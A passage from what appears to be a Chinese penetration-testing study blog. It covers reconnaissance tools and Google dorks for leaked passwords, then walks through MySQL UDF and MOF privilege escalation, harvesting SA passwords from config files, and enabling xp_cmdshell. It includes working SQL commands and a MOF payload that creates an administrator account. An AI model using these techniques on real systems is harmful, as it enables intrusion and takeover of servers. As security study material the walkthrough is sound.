class="selector-tag">brt</span> <span class="selector-tag">-D</span> <span class="selector-tag">dnsbig</span><span class="selector-class">.txt</span></span><br><span class="line"><span class="selector-tag">-</span> <span class="selector-tag">dnsrecon</span> <span class="selector-tag">-t</span> <span class="selector-tag">std</span> <span class="selector-tag">-d</span> <span class="selector-tag">sina</span><span class="selector-class">.com</span></span><br></pre></td></tr></table></figure>

<h5 id="2-fierce"><a href="#2-fierce" class="headerlink" title="2.fierce"></a>2.fierce</h5><figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># dpkg -L fierce</span></span><br><span class="line">	/usr/share/fierce/hosts.txt</span><br><span class="line"></span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># cp /usr/share/fierce/hosts.txt wordlist.txt -f</span></span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># fierce -dnsserver 8.8.8.8 -dns sina.com.cn -wordlist wordlist.txt</span></span><br></pre></td></tr></table></figure>

<h5 id="3-dnsenum"><a href="#3-dnsenum" class="headerlink" title="3.dnsenum"></a>3.dnsenum</h5><figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># dpkg -L dnsenum</span></span><br><span class="line">	/usr/share/dnsenum/dns.txt</span><br><span class="line"></span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># cp /usr/share/dnsenum/dns.txt dnsenum.txt </span></span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># dnsenum -f dnsenum.txt -dnsserver 8.8.8.8 sina.com -o sina.xml</span></span><br></pre></td></tr></table></figure>

<h5 id="dnsmap"><a href="#dnsmap" class="headerlink" title="dnsmap"></a>dnsmap</h5><figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># dpkg -L dnsmap</span></span><br><span class="line">/usr/share/dnsmap/wordlist_TLAs.txt</span><br><span class="line"></span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># cp /usr/share/dnsmap/wordlist_TLAs.txt dnsmap.txt</span></span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># dnsmap sina.com -w dnsmap.txt</span></span><br></pre></td></tr></table></figure>

<h5 id="dnsrecon"><a href="#dnsrecon" class="headerlink" title="dnsrecon"></a>dnsrecon</h5><figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># dpkg -L dnsrecon</span></span><br><span class="line">/usr/share/dnsrecon/namelist.txt</span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># dnsrecon -d sina.com --lifetime 10 -t brt -D /usr/share/dnsrecon/namelist.txt</span></span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># dnsrecon -t std -d sina.com</span></span><br></pre></td></tr></table></figure>

<h5 id="DNS注册信息"><a href="#DNS注册信息" class="headerlink" title="DNS注册信息"></a>DNS注册信息</h5><p>1.在网页查询</p>
<p><img src="https://img-blog.csdnimg.cn/20190413164053891.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p><a href="https://www.afrinic.net/" target="_blank" rel="noopener">https://www.afrinic.net/</a></p>
<p><a href="http://www.apnic.net/" target="_blank" rel="noopener">http://www.apnic.net/</a></p>
<p><a href="https://www.arin.net/" target="_blank" rel="noopener">https://www.arin.net</a></p>
<p><a href="https://www.iana.com/" target="_blank" rel="noopener">https://www.iana.com</a></p>
<p>2.使用</p>
<figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># whois sina.com</span></span><br></pre></td></tr></table></figure>

<figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># whois wooyun.org</span></span><br></pre></td></tr></table></figure>

<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="symbol">root@</span>kali:~# whois -h whois.apnic.net <span class="number">192.0</span><span class="number">.43</span><span class="number">.10</span></span><br></pre></td></tr></table></figure>

<h3 id="二、搜索引擎"><a href="#二、搜索引擎" class="headerlink" title="二、搜索引擎"></a>二、搜索引擎</h3><h5 id="1-简介"><a href="#1-简介" class="headerlink" title="1.简介"></a>1.简介</h5><ul>
<li>公司新闻动态</li>
<li>重要雇员信息</li>
<li>机密文档/网络拓扑</li>
<li>用户名密码</li>
<li>目标系统软硬件技术架构</li>
</ul>
<h4 id="SHODAN"><a href="#SHODAN" class="headerlink" title="SHODAN:"></a>SHODAN:</h4><h5 id="1-简介-1"><a href="#1-简介-1" class="headerlink" title="1.简介"></a>1.简介</h5><ul>
<li>搜索联网的设备</li>
<li>Banner：http、ftp、ssh、telnet</li>
<li>官网<ul>
<li><a href="https://www.shodan.io/" target="_blank" rel="noopener">https://www.shodan.io/</a></li>
</ul>
</li>
<li>查8.8.8.8</li>
</ul>
<p>常见filter：</p>
<ul>
<li>net</li>
</ul>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">net:<span class="number">8.8</span><span class="number">.8</span><span class="number">.0</span>/<span class="number">24</span></span><br></pre></td></tr></table></figure>

<ul>
<li>city</li>
</ul>
<figure class="highlight avrasm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">city:</span>Beijing</span><br></pre></td></tr></table></figure>

<ul>
<li>country（CN、US）</li>
</ul>
<figure class="highlight avrasm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">country:</span>US</span><br></pre></td></tr></table></figure>

<ul>
<li>port（80、21、22、23）</li>
</ul>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">port:<span class="number">80</span></span><br></pre></td></tr></table></figure>

<ul>
<li>os</li>
</ul>
<figure class="highlight avrasm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">os:</span>linux</span><br></pre></td></tr></table></figure>

<ul>
<li>Hostname（主机或域名）</li>
</ul>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="built_in">hostname</span>:www.baidu.<span class="keyword">com</span></span><br></pre></td></tr></table></figure>



<h4 id="GOOGLE搜索"><a href="#GOOGLE搜索" class="headerlink" title="GOOGLE搜索"></a>GOOGLE搜索</h4><h5 id="1-简介-2"><a href="#1-简介-2" class="headerlink" title="1.简介"></a>1.简介</h5><ul>
<li>inurl:“level/15/exec/-/show”</li>
<li>intitle:“netbotz appliance” “ok”</li>
<li>inurl /admin/login.php</li>
<li>inurl:qq.txt</li>
<li>filetype:xls “username | password“</li>
<li>inurl:ftp “password” filetype:xls site:baidu.com</li>
<li>Service.pwd</li>
<li><a href="http://exploit-db.com/google-dorks" target="_blank" rel="noopener">http://exploit-db.com/google-dorks</a></li>
</ul>
<h4 id="YANDEX"><a href="#YANDEX" class="headerlink" title="YANDEX"></a>YANDEX</h4><h5 id="1-简介-3"><a href="#1-简介-3" class="headerlink" title="1.简介"></a>1.简介</h5><ul>
<li>世界第四大搜索引擎——俄罗斯</li>
<li><a href="https://www.yandex.com/" target="_blank" rel="noopener">https://www.yandex.com/</a></li>
</ul>
<h4 id="查询用户信息"><a href="#查询用户信息" class="headerlink" title="查询用户信息"></a>查询用户信息</h4><p>1.邮件</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Usage</span>: theharvester options </span><br><span class="line"></span><br><span class="line">   -d: Domain to search or company name</span><br><span class="line">   -b: data source: google, googleCSE, bing, bingapi, pgp, linkedin,</span><br><span class="line">                    google-profiles, jigsaw, twitter, googleplus, all</span><br><span class="line"></span><br><span class="line">   -s: Start in result number X (default: 0)</span><br><span class="line">   -v: Verify host name via dns resolution and search for virtual hosts</span><br><span class="line">   -f: Save the results into an HTML and XML file (both)</span><br><span class="line">   -n: Perform a DNS reverse query on all ranges discovered</span><br><span class="line">   -c: Perform a DNS brute force for the domain name</span><br><span class="line">   -t: Perform a DNS TLD expansion discovery</span><br><span class="line">   -e: Use this DNS server</span><br><span class="line">   -l: Limit the number of results to work with(bing goes from 50 to 50 results,</span><br><span class="line">        google 100 to 100, and pgp doesn't use this option)</span><br><span class="line">   -h: use SHODAN database to query discovered hosts</span><br><span class="line"></span><br><span class="line"><span class="attribute">Examples:</span></span><br><span class="line">    theharvester -d microsoft.com -l 500 -b google -h myresults.html</span><br><span class="line">    theharvester -d microsoft.com -b pgp</span><br><span class="line">    theharvester -d microsoft -l 200 -b linkedin</span><br><span class="line">    theharvester -d apple.com -b googleCSE -l 500 -s 300</span><br><span class="line"></span><br><span class="line">root@kali:~# theharvester -d microsoft.com -b pgp</span><br></pre></td></tr></table></figure>

<p>2.文件</p>
<ul>
<li>Usage: metagoofil options</li>
</ul>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">-d: <span class="keyword">domain</span> <span class="keyword">to</span> <span class="keyword">search</span></span><br><span class="line">-t: filetype <span class="keyword">to</span> download (pdf,doc,xls,ppt,odp,ods,docx,xlsx,pptx)</span><br><span class="line">-l: <span class="keyword">limit</span> <span class="keyword">of</span> results <span class="keyword">to</span> <span class="keyword">search</span> (<span class="keyword">default</span> <span class="number">200</span>)</span><br><span class="line">-h: <span class="keyword">work</span> <span class="keyword">with</span> documents <span class="keyword">in</span> directory (use "yes" <span class="keyword">for</span> <span class="keyword">local</span> analysis)</span><br><span class="line">-n: <span class="keyword">limit</span> <span class="keyword">of</span> files <span class="keyword">to</span> download</span><br><span class="line">-o: working directory (<span class="keyword">location</span> <span class="keyword">to</span> save downloaded files)</span><br><span class="line">-f: output file</span><br></pre></td></tr></table></figure>

<ul>
<li>Examples<ul>
<li>metagoofil -d <a href="http://apple.com/" target="_blank" rel="noopener">apple.com</a> -t doc,pdf -l 200 -n 50 -o applefiles -f results.html</li>
<li>metagoofil -h yes -o applefiles -f results.html (local dir analysis)</li>
</ul>
</li>
</ul>
<h4 id="CUPP制作个人专属字典"><a href="#CUPP制作个人专属字典" class="headerlink" title="CUPP制作个人专属字典"></a>CUPP制作个人专属字典</h4><h5 id="1-简介-4"><a href="#1-简介-4" class="headerlink" title="1.简介"></a>1.简介</h5><ul>
<li>按个人信息生成其专属的密码字典</li>
</ul>
<h5 id="2-安装"><a href="#2-安装" class="headerlink" title="2.安装"></a>2.安装</h5><figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">git clone http<span class="variable">s:</span>//github.<span class="keyword">com</span>/Mebus/cupp.git</span><br><span class="line"><span class="keyword">python</span> cupp.<span class="keyword">py</span> -i</span><br></pre></td></tr></table></figure>

<h4 id="图片信息"><a href="#图片信息" class="headerlink" title="图片信息"></a>图片信息</h4><p>1.exif (linux)</p>
<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line">用法: exif [选项<span class="string">...</span>] 文件</span><br><span class="line">  -v, <span class="params">--version</span>                   显示软件版本</span><br><span class="line">  -i, <span class="params">--ids</span>                       显示 IDs，以代替信息标识名称</span><br><span class="line">  -t, <span class="params">--tag=</span>信息标识                  选择信息标识</span><br><span class="line">      <span class="params">--ifd=IFD</span>                   选择 IFD</span><br><span class="line">  -l, <span class="params">--list-tags</span>                 列出所有 EXIF 信息标识</span><br><span class="line">  -|, <span class="params">--show-mnote</span>                显示 MakerNote 的内容</span><br><span class="line">      <span class="params">--remove</span>                    删除信息标识或是 ifd</span><br><span class="line">  -s, <span class="params">--show-description</span>          显示信息标识说明</span><br><span class="line">  -e, <span class="params">--extract-thumbnail</span>         解出缩略图</span><br><span class="line">  -r, <span class="params">--remove-thumbnail</span>          删除缩略图</span><br><span class="line">  -n, <span class="params">--insert-thumbnail=FILE</span>     将 FILE 作为缩略图插入</span><br><span class="line">      <span class="params">--no-fixup</span>                  不修复文件中存在的标识信息</span><br><span class="line">  -o, <span class="params">--output=FILE</span>               将数据写入 FILE</span><br><span class="line">      <span class="params">--set-value=STRING</span>          tag 值</span><br><span class="line">  -c, <span class="params">--create-exif</span>               如果 EXIF 数据不存在就创建它</span><br><span class="line">  -m, <span class="params">--machine-readable</span>          以机器可读的格式<span class="params">(tab 分隔)</span>输出</span><br><span class="line">  -w, <span class="params">--width=</span>宽度                  输出宽度</span><br><span class="line">  -x, <span class="params">--xml-output</span>                以 XML 格式输出</span><br><span class="line">  -d, <span class="params">--debug</span>                     显示调示信息</span><br><span class="line"></span><br><span class="line">帮助选项：</span><br><span class="line">  -?, <span class="params">--help</span>                      显示此帮助信息</span><br><span class="line">      <span class="params">--usage</span>                     显示简短的使用信息</span><br></pre></td></tr></table></figure>







]]></content>
      <categories>
        <category>渗透测试学习</category>
      </categories>
      <tags>
        <tag>信息收集</tag>
      </tags>
  </entry>
  <entry>
    <title>windows渗透测试中常见提权方式总结(二)</title>
    <url>/2020/04/28/shen-tou-ce-shi-zhong-chang-jian-ti-quan-fang-shi-zong-jie-er/</url>
    <content><![CDATA[<h2 id="渗透测试中常见提权方式总结（二）"><a href="#渗透测试中常见提权方式总结（二）" class="headerlink" title="渗透测试中常见提权方式总结（二）"></a>渗透测试中常见提权方式总结（二）</h2><h3 id="数据库提权"><a href="#数据库提权" class="headerlink" title="数据库提权"></a>数据库提权</h3><h4 id="mysql提权概述"><a href="#mysql提权概述" class="headerlink" title="mysql提权概述"></a>mysql提权概述</h4><h5 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h5><ul>
<li><strong>功能型：</strong>udf提权</li>
<li><strong>技巧型：</strong>启动项提权</li>
<li><strong>漏洞型：</strong>mof提权</li>
</ul>
<h4 id="mysql之UDF提权"><a href="#mysql之UDF提权" class="headerlink" title="mysql之UDF提权"></a>mysql之UDF提权</h4><h4 id="原理分析："><a href="#原理分析：" class="headerlink" title="原理分析："></a>原理分析：</h4><p>​        <strong>UDF</strong>(user-defined function)是MySQL的一个拓展接口，也可称之为<strong>用户自定义函数</strong>，它是用来拓展MySQL的技术手段，可以说是数据库功能的一种扩展，用户通过自定义函数来实现在MySQL中无法方便实现的功能，其添加的新函数都可以在SQL语句中调用，就像本机函数如ABS()或SOUNDEX()一样方便。</p>
<p>​    <strong>动态链接库</strong>：是把程序代码中会使用的函数编译成机器码，不过是保存在.dll文件中。另外在编译时，不会把函数的机器码复制一份到可执行文件中。编译器只会在.exe的执行文件里，说明所要调用的函数放在哪一个*.dll文件。程序执行使用到这些函数时，操作系统会把dll文件中的函数拿出来给执行文件使用</p>
<p>​    <strong>udf是Mysql类提权的方式之一</strong>。前提是已知mysql中root的账号密码，我们在拿到webshell后，可以看网站根目录下的config.php里，一般都有mysql的账号密码。利用root权限，创建带有调用cmd函数的’udf.dll’(动态链接库)。当我们把’udf.dll’导出指定文件夹引入Mysql时，其中的调用函数拿出来当作mysql的函数使用。这样我们自定义的函数才被当作本机函数执行。在使用CREAT FUNCITON调用dll中的函数后，mysql账号转化为system权限，从而来提权。</p>
<h4 id="提权常见手法："><a href="#提权常见手法：" class="headerlink" title="提权常见手法："></a>提权常见手法：</h4><p>一般来说使用udf提权的常规手法：</p>
<ul>
<li><p>上传大马webshell，利用大马中的UDF提权功能完成提权。</p>
</li>
<li><p>反弹shell，进而获取交互式tty shell，在shell中连接本地数据库，从而完成UDF提权。</p>
</li>
<li><p>利用FuckMySQL，本地执行命令。<a href="https://github.com/v5est0r/Python_FuckMySQL" target="_blank" rel="noopener">FuckMySQL</a>项目针对Windows平台。</p>
</li>
<li><p>利用SQLMAP中的-d参数连接远程数据库，自动上传so库完成UDF提权，从而获取os-shell</p>
</li>
<li><p>使用Navicat等数据库管理工具连接远程数据库，从而完成UDF提权。</p>
<p>其实这些手法的主要目的都是<strong>想方设法登陆数据库服务来执行SQL语句，进而获取到启动MySQL服务的root权限，</strong></p>
</li>
</ul>
<h4 id="提权的一些前提："><a href="#提权的一些前提：" class="headerlink" title="提权的一些前提："></a>提权的一些前提：</h4><p>利用udf提权有一些利用的先决条件：</p>
<ul>
<li>MySQL 数据库没有开启安全模式。</li>
<li>已知的数据库账号具有对 MySQL 数据库 insert 和 delete 的权限，最好是 root 最高权限。</li>
<li>shell 有写入到数据库安装目录的权限。</li>
</ul>
<p><strong>高版本mysql(mysql Version&gt;5.7)遇到的一些问题：</strong></p>
<ul>
<li><p>secure-file-priv默认不为空，即不允许在任意文件夹中导出文件；</p>
<ul>
<li>如果对方开启了安全模式，我们是无法利用这个办法进行提权的，所以，为了完成今天的浮现，我们需要关闭安全模式。</li>
</ul>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">secure_file_priv</span>=<span class="string">""</span></span><br></pre></td></tr></table></figure>

<pre><code>将这个代码插入到 mysql 配置文件的最后，重启服务，便可以关闭安全模式。</code></pre></li>
<li><p>默认root用户使用的authentication-plugins为auth_socket，即在本地登录MySQL时使用unix套接字登录，而非密码；</p>
</li>
<li><p>mysql.user下password列更改为authentication_string列。</p>
</li>
</ul>
<h4 id="提权复现"><a href="#提权复现" class="headerlink" title="提权复现"></a>提权复现</h4><p>首先通过各种手段获取一个网站的webshell，使用菜刀连接。</p>
<p><img src="/2020/04/28/shen-tou-ce-shi-zhong-chang-jian-ti-quan-fang-shi-zong-jie-er/QQ%E6%88%AA%E5%9B%BE20200428160603.png" alt></p>
<p>这个时候获取到的权限往往是一个低用户权限，我们尝试使用udf数据库提权</p>
<p>我们这里上传一个暗月的mysql数据库提权大马，命名为<code>dama.php</code></p>
<p><a href="https://github.com/tennc/webshell这个里面包含了很多webshell，里面还有几种mysql数据库提权马，也可以试试（建议下到虚拟机里！！！！！）" target="_blank" rel="noopener">https://github.com/tennc/webshell这个里面包含了很多webshell，里面还有几种mysql数据库提权马，也可以试试（建议下到虚拟机里！！！！！）</a></p>
<p><img src="/2020/04/28/shen-tou-ce-shi-zhong-chang-jian-ti-quan-fang-shi-zong-jie-er/QQ%E6%88%AA%E5%9B%BE20200428160926.png" alt></p>
<p>直接网页访问，提示我们需要数据库密码，这里我们可以到网站下数据库配置文件找下<code>config.php</code></p>
<p><img src="/2020/04/28/shen-tou-ce-shi-zhong-chang-jian-ti-quan-fang-shi-zong-jie-er/QQ%E6%88%AA%E5%9B%BE20200428163445.png" alt></p>
<p>登录后，发现这里直接给出了一些数据库版本为：5.5.53</p>
<p>还可以执行数据库命令：</p>
<p><img src="/2020/04/28/shen-tou-ce-shi-zhong-chang-jian-ti-quan-fang-shi-zong-jie-er/QQ%E6%88%AA%E5%9B%BE20200428161455.png" alt></p>
<p>这里补充一个点:</p>
<ul>
<li>如果mysql版本大于5.1，udf.dll文件必须放置在mysql安装目录的lib\plugin文件夹下</li>
<li>如果mysql版本小于5.1，udf.dll文件在windows server 2003下放置于c:\windows\system32目录，在windows server 2000下放置在c:\winnt\system32目录</li>
</ul>
<p>但是mysql默认状态下没有这个文件夹，需要我们自行创建。</p>
<p>用NTFS ADS流模式突破进而创建文件夹</p>
<figure class="highlight crystal"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> @@basedir;  <span class="regexp">//</span>查找到mysql的目录</span><br><span class="line"><span class="keyword">select</span> <span class="string">'It is dll'</span> into dumpfile <span class="string">'C:\\Program Files\\MySQL\\MySQL Server 5.1\\lib::$INDEX_ALLOCATION'</span>;    <span class="regexp">//</span>利用NTFS ADS创建<span class="class"><span class="keyword">lib</span>目录</span></span><br><span class="line"><span class="keyword">select</span> <span class="string">'It is dll'</span> into dumpfile <span class="string">'C:\\Program Files\\MySQL\\MySQL Server 5.1\\lib\\plugin::$INDEX_ALLOCATION'</span>;    <span class="regexp">//</span>利用NTFS ADS创建plugin目录</span><br></pre></td></tr></table></figure>

<p>我直接在菜刀下创建plugin文件夹</p>
<p>然后最关键的一步：<strong>导出UDF文件</strong></p>
<p><img src="/2020/04/28/shen-tou-ce-shi-zhong-chang-jian-ti-quan-fang-shi-zong-jie-er/QQ%E6%88%AA%E5%9B%BE20200428165018.png" alt></p>
<p>导出后，再次尝试文件已经存在，说明导入成功。</p>
<p>现在只是把udf的动态链接库导出到指定文件夹，还不能使用里面的自定义函数。要想使用自定义函数，就要把udf.dll中的自定义函数引入。</p>
<p>引入sys_eval函数：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">FUNCTION</span> sys_eval <span class="keyword">RETURNS</span> <span class="keyword">STRING</span> <span class="keyword">SONAME</span> <span class="string">'moonudf.dll'</span></span><br></pre></td></tr></table></figure>

<p>其中，sys_eval函数是执行任意命令，并将输出返回函数的名字，moonudf.dll是你导出文件的名字;</p>
<p>之后使用命令模板即可执行命令：</p>
<figure class="highlight ada"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> sys_eval(<span class="symbol">'ipconfig</span>)</span><br></pre></td></tr></table></figure>

<p>也可以直接使用大马这里的功能选项：</p>
<p><img src="/2020/04/28/shen-tou-ce-shi-zhong-chang-jian-ti-quan-fang-shi-zong-jie-er/QQ%E6%88%AA%E5%9B%BE20200428174431.png" alt></p>
<h4 id="其他udf提权方法："><a href="#其他udf提权方法：" class="headerlink" title="其他udf提权方法："></a>其他udf提权方法：</h4><h5 id="msf-udp模块"><a href="#msf-udp模块" class="headerlink" title="msf udp模块"></a>msf udp模块</h5><p>我们使用命令<code>search udf</code>即可看到udf提权payload</p>
<p><img src="/2020/04/28/shen-tou-ce-shi-zhong-chang-jian-ti-quan-fang-shi-zong-jie-er/QQ%E6%88%AA%E5%9B%BE20200428170837.png" alt></p>
<p>进入模块，看一下需要配置选项：</p>
<p><img src="/2020/04/28/shen-tou-ce-shi-zhong-chang-jian-ti-quan-fang-shi-zong-jie-er/QQ%E6%88%AA%E5%9B%BE20200428170940.png" alt></p>
<p>注：这里注意版本，适用于5.5.9以下，</p>
<h5 id="sqlmap命令"><a href="#sqlmap命令" class="headerlink" title="sqlmap命令"></a>sqlmap命令</h5><p>使用SQLMAP的-d命令来连接服务并执行UDF提权语句；</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">sqlmap</span> -d mysql://root:xxxxxx<span class="variable">@VPS</span>:3306/mysql --os-shell</span><br></pre></td></tr></table></figure>

<h3 id="mysql数据库提权之MOF提权"><a href="#mysql数据库提权之MOF提权" class="headerlink" title="mysql数据库提权之MOF提权"></a>mysql数据库提权之MOF提权</h3><h4 id="原理分析：-1"><a href="#原理分析：-1" class="headerlink" title="原理分析："></a>原理分析：</h4><p>利用了<code>c:/windows/system32/wbem/mof/</code>目录下的 <code>nullevt.mof</code> 文件，每分钟都会在一个特定的时间去执行一次的特性，来写入我们的cmd命令使其被带入执行。</p>
<h4 id="提权复现："><a href="#提权复现：" class="headerlink" title="提权复现："></a>提权复现：</h4><p>首先需要具备Mysql的<code>root</code>权限，我们还是使用上面菜刀连接获得的webshell</p>
<p>然后我们将<code>nullevt.mof</code>导入到一下可写目录</p>
<p><img src="/2020/04/28/shen-tou-ce-shi-zhong-chang-jian-ti-quan-fang-shi-zong-jie-er/QQ%E6%88%AA%E5%9B%BE20200428185617.png" alt></p>
<p>文件内容：</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="comment">#pragma namespace("\\\\.\\root\\subscription")</span></span><br><span class="line">instance of __EventFilter as <span class="variable">$EventFilter</span></span><br><span class="line">&#123;</span><br><span class="line">EventNamespace = <span class="string">"Root\\Cimv2"</span>;</span><br><span class="line">Name = <span class="string">"filtP2"</span>;</span><br><span class="line">Query = <span class="string">"Select * From __InstanceModificationEvent "</span></span><br><span class="line"><span class="string">"Where TargetInstance Isa \"Win32_LocalTime\" "</span></span><br><span class="line"><span class="string">"And TargetInstance.Second = 5"</span>;</span><br><span class="line">QueryLanguage = <span class="string">"WQL"</span>;</span><br><span class="line">&#125;;</span><br><span class="line">instance of ActiveScriptEventConsumer as <span class="variable">$Consumer</span></span><br><span class="line">&#123;</span><br><span class="line">Name = <span class="string">"consPCSV2"</span>;</span><br><span class="line">ScriptingEngine = <span class="string">"JScript"</span>;</span><br><span class="line">ScriptText =</span><br><span class="line"><span class="string">"var WSH = new ActiveXObject(\"WScript.Shell\")\nWSH.run(\"net.exe user test test /add\")"</span>;</span><br><span class="line">&#125;;</span><br><span class="line">instance of __FilterToConsumerBinding</span><br><span class="line">&#123;</span><br><span class="line">Consumer = <span class="variable">$Consumer</span>;</span><br><span class="line">Filter = <span class="variable">$EventFilter</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>这里<code>net user test test /add</code>可以自定义，我们这里就是添加一个test用户。</p>
<p>之后我们使用sql语句将文件导入到<code>c:/windows/system32/wbem/mof/</code>下</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">load_file</span>(<span class="string">"C:/phpStudy/WWW/nullevt.mof"</span>) <span class="keyword">into</span> <span class="keyword">dumpfile</span> <span class="string">"c:/windows/system32/wbem/mof/nullevt.mof"</span></span><br></pre></td></tr></table></figure>

<p>可以使用菜刀下的数据库管理工具执行</p>
<p><img src="/2020/04/28/shen-tou-ce-shi-zhong-chang-jian-ti-quan-fang-shi-zong-jie-er/QQ%E6%88%AA%E5%9B%BE20200428190009.png" alt></p>
<p>执行后，到win2003上查看用户：</p>
<p><img src="/2020/04/28/shen-tou-ce-shi-zhong-chang-jian-ti-quan-fang-shi-zong-jie-er/QQ%E6%88%AA%E5%9B%BE20200428190809.png" alt></p>
<p>之后我们可以将自定义的命令改为：</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line">net.exe localgroup administrators test /<span class="keyword">add</span></span><br></pre></td></tr></table></figure>

<p>即可对添加的用户进行提权。</p>
<h4 id="其他mof提权方法："><a href="#其他mof提权方法：" class="headerlink" title="其他mof提权方法："></a>其他mof提权方法：</h4><h5 id="msf-mof提权"><a href="#msf-mof提权" class="headerlink" title="msf mof提权"></a>msf mof提权</h5><p>使用<code>mysql_mof</code>模块，有的版本不能成功，</p>
<h5 id="上传mof-php"><a href="#上传mof-php" class="headerlink" title="上传mof.php"></a>上传mof.php</h5><p>直接上传mof.php执行命令</p>
<p><img src="/2020/04/28/shen-tou-ce-shi-zhong-chang-jian-ti-quan-fang-shi-zong-jie-er/QQ%E6%88%AA%E5%9B%BE20200428184713.png" alt></p>
<p>我试了几次都失败了，这里应该需要开启mysql远程连接的功能。。。。</p>
<h4 id="防范方法"><a href="#防范方法" class="headerlink" title="防范方法"></a>防范方法</h4><p>​        Mysql Root权限MOF方法提权其前提条件是能够将上传的nullevt.mof复制到系统目录下，例如c:\windows\system32\wbem\mof中，如果无法复制则会提权失败。一般对Windows2003以下操作系统效果较好，Windows2008以上由于保护机制，较少能够成功。因此可以采取以下措施进行防范：</p>
<ul>
<li>在程序数据库连接文件中尽量不要使用Root帐号进行连接。</li>
<li>Root帐号使用强加密方式，采用字母大小写+数字+特殊字符，密码位数15位以上。</li>
<li>对Mysql数据库的mysql数据库目录权限严格限制，IIS用户无法读写该文件。</li>
</ul>
<h3 id="SQL-Server提权"><a href="#SQL-Server提权" class="headerlink" title="SQL  Server提权"></a>SQL  Server提权</h3><h4 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h4><p><img src="/2020/04/28/shen-tou-ce-shi-zhong-chang-jian-ti-quan-fang-shi-zong-jie-er/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4Njg0NTA0,size_16,color_FFFFFF,t_70" alt="img"></p>
<p>xp_cmdshell是Sql Server中的一个组件，我们可以用它来执行系统命令。</p>
<h4 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h4><p><strong>利用前提：</strong></p>
<ul>
<li>getshell或者存在sql注入并且能够执行命令</li>
<li>sql server是system权限，sql server默认就是system权限。</li>
<li>获取SA用户口令</li>
</ul>
<h5 id="获取SA用户口令方法"><a href="#获取SA用户口令方法" class="headerlink" title="获取SA用户口令方法"></a>获取SA用户口令方法</h5><ul>
<li>Webshell或源码获取，一般在网站的配置文件中有存放明文账号密码，常用配置文件名如：</li>
</ul>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">conn.aspx</span><br><span class="line">config.aspx</span><br><span class="line">config.php</span><br><span class="line">web.config</span><br><span class="line"><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span>.</span><br><span class="line"></span><br><span class="line">一般格式如：</span><br><span class="line"></span><br><span class="line"><span class="attribute">server</span>=localhost;</span><br><span class="line"><span class="attribute">UID</span>=sa;</span><br><span class="line"><span class="attribute">PWD</span>=shadowflow</span><br></pre></td></tr></table></figure>

<p>获得sa口令，即可通过我们上传的大马进行登录，获得sa相应权限</p>
<p>有了xp_cmdshell的话可以执行系统命令，该组件默认是关闭的，因此需要把它打开。</p>
<h5 id="开启xp-cmdshell"><a href="#开启xp-cmdshell" class="headerlink" title="开启xp_cmdshell"></a>开启xp_cmdshell</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">exec</span> sp_configure <span class="string">'show advanced options'</span>, 1;reconfigure;</span><br><span class="line"><span class="built_in">exec</span> sp_configure <span class="string">'xp_cmdshell'</span>,1;reconfigure;</span><br></pre></td></tr></table></figure>

